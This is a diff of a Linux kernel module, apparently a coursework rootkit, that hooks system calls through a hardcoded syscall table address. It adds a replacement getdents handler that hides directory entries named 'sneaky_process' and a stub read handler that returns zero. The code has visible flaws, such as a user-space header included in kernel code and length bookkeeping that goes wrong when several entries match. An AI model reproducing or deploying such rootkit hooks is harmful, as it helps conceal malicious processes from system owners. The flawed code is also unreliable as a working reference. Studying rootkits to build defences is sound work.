@@ -9,6 +9,7 @@
 #include <linux/module.h>      // for all modules
 #include <linux/moduleparam.h> // *newly added for module pamameter
 #include <linux/sched.h>
+#include <string.h>
 
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -49,7 +50,7 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // This is used for all system calls.
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                     unsigned int count);
-asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
+asmlinkage int (*original_open)(const char *pathname, int flags);
 asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 // Define our new sneaky version of the 'open' syscall
@@ -57,6 +58,42 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   printk(KERN_INFO "Very, very Sneaky!\n");
   return original_call(pathname, flags);
 }
+
+/* Own version of getdents */
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
+                                   unsigned int count) {
+  int totalbytes = original_getdents(fd, dirp, count); // get original bytes
+
+  struct linux_dirent *current = dirp; // current directory entry
+
+  int position = 0;            // current position in terms of bytes offset
+  int sneaky_len = totalbytes; // sneaky version of length
+
+  while (position < sneaky_len) {
+    // compare if current is "sneaky_process"
+    if (strcmp(current->d_name, "sneaky_process") == 0) { // is sneaky process
+      sneaky_len = totalbytes - current->d_reclen;        // hide length
+
+      char *next = (char *)current + current->d_reclen; // pointer to the next
+
+      // completely cover current memory
+      size_t startaddress = (size_t)next;
+      size_t endaddress = (size_t)dirp + totalbytes;
+      memmove(current, next, endaddress - startaddress);
+
+      continue;
+    }
+
+    // move to the next one
+    position += current->d_reclen;
+    current = (struct linux_dirent *)((char *)current + current->d_reclen);
+  }
+
+  return sneaky_len;
+}
+
+/* Own version of read */
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) { return 0; }
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
